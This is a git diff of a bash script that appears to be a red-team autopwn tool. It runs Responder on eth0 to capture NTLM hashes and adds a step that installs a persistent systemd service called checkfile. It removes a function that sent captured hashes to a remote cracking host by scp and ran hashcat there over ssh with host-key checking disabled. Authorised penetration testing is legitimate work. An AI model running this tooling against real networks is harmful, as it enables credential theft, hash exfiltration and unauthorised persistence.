@@ -46,6 +46,8 @@ fi
 #scratch that - first we are going to identify computers with SMB signing disabled. Otherwise, Responder doesn't help much
 #Also, scratch THAT. Third time is the charm. First, we find our IP and subnet info, THEN we find unsigned SMB, THEN we run responder, THEN WE FIRE THE MISSILES!!
 
+
+
 prolly_the_right_IP=$(ip addr show eth0 | awk '/inet /{print $2; exit}' | cut -d/ -f1)
 echo -e "${GREEN}Your IP is $prolly_the_right_IP"
 wut_subnet=$(echo $prolly_the_right_IP | cut -f 1,2,3 -d ".").0/24
@@ -78,28 +80,21 @@ more_enum_plz(){
     }
 
 more_hashes_plz(){
-    
+    echo -e "${GREEN}[+] Installing the checkfile daemon"
     #only when hashes are found, run the cracker
-    ./check_file.sh
+    chmod +x ${PWD}/monitor.sh
+    chmod +x ${PWD}/send_it.sh
+    
+    if [ ! -f /lib/systemd/system/checkfile.service ]; then
+      cat ${PWD}/checkfile.service > /lib/systemd/system/checkfile.service
+      systemctl daemon-reload
+      systemctl enable checkfile
+      systemctl start checkfile
+      echo -e "${GREEN}[+] Checkfile daemon installed successfully (I think)"
+    fi
     responder -I eth0
   }
-
-
-i_can_haz_cracks(){
-    #I had to re-work this section and just make it a difference script :/ There was no way to programmatically re-enter this function within this specific script/PID run after backghrounding 
-
-
-    #This section assumes you have a cracking rig (AKA big-rig for my team) already connected via VPN somewhere. 
-    #If you don't, you can run this locally or just comment it out
-    #This will grab all the SMB logs, scp them to the big-rig cracking machine, and run hashcat
-    cp /usr/share/responder/logs/SMB-NTLM*.txt ./autopwn_hashes
-    scp autopwn_hashes autopwn@big-rig:/home/dispareo/autopwn
-    #Now that the file is copied over, crack it!
-    ssh -o StrictHostKeyChecking=no -l dispareo big-rig "hashcat -m 5600 -a 0 autopwn_hashes -w 4 -r OneRuleToRuleThemStill.rul"
-}
-unsigned
-recon_one
-more_enum_plz
+#unsigned
+#recon_one
+#more_enum_plz
 more_hashes_plz
-
-#i_can_haz_cracks
